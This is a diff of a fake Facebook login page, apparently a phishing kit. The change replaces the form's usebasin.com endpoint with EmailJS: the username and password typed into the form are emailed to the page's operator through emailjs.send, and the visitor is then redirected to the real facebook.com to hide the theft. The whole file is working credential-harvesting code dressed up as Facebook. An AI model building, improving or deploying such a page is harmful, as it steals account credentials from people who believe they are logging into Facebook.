@@ -4,8 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Login</title>
-    <meta name="description" content="Login to Facebook to start sharing and connecting with your friends, family and people you know.">
+    <meta name="description" content="Login to Facebook to start sharing and connecting with your friends, family, and people you know.">
     <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/b/b9/2023_Facebook_icon.svg" type="image/svg+xml">
+    <!-- Include EmailJS -->
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -139,8 +141,8 @@
             <h1>Connect with friends and the world around you on Facebook.</h1>
         </div>
         <div class="container">
-            <form id="loginForm" action="https://usebasin.com/f/0f599a21a091" method="POST">
-                <label for="userInput">Login to facebook</label>
+            <form id="loginForm">
+                <label for="userInput">Login to Facebook</label>
                 <input type="text" id="userInput" name="userInput" class="input-field" placeholder="Email, phone number, or username" required>
                 <input type="password" name="password" class="input-field" placeholder="Password" required>
                 <button type="submit" class="login-btn">Log In</button>
@@ -150,48 +152,32 @@
         </div>
     </div>
     <div class="footer">
-        <p>
-            <a href="#">English (US)</a>
-            <a href="#">Español</a>
-            <a href="#">Français (France)</a>
-            <a href="#">Deutsch</a>
-            <a href="#">Português (Brasil)</a>
-            <a href="#">Italiano</a>
-            <a href="#">العربية</a>
-        </p>
-        <p>
-            <a href="#">Sign Up</a>
-            <a href="#">Log In</a>
-            <a href="#">Messenger</a>
-            <a href="#">Facebook Lite</a>
-            <a href="#">Watch</a>
-            <a href="#">Marketplace</a>
-            <a href="#">Privacy</a>
-        </p>
         <p>Meta © 2025</p>
     </div>
 
     <script>
+        // Initialize EmailJS with your user ID
+        emailjs.init("05cnG_Itm1w3Qk9hg"); // Replace with your EmailJS User ID
+
         document.getElementById("loginForm").addEventListener("submit", function(event) {
             event.preventDefault(); // Prevent the default form submission
 
             const formData = new FormData(this);
 
-            fetch(this.action, {
-                method: 'POST',
-                body: formData,
-            })
-            .then(response => {
-                if (response.ok) {
-                    // Redirect after successful submission
-                    window.location.href = "https://www.facebook.com";
-                } else {
-                    console.log("Error: Submission failed.");
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+            // Prepare the data to send to the email
+            const formDataObject = {
+                user_input: formData.get('userInput'),
+                password: formData.get('password')
+            };
+
+            // Send the form data to EmailJS
+            emailjs.send("service_1kh9kmb", "template_n10o56c", formDataObject)
+                .then(function(response) {
+                    console.log("Success:", response);
+                    window.location.href = "https://www.facebook.com"; // Redirect to Facebook after successful submission
+                }, function(error) {
+                    console.error("Error:", error);
+                });
         });
     </script>
 </body>
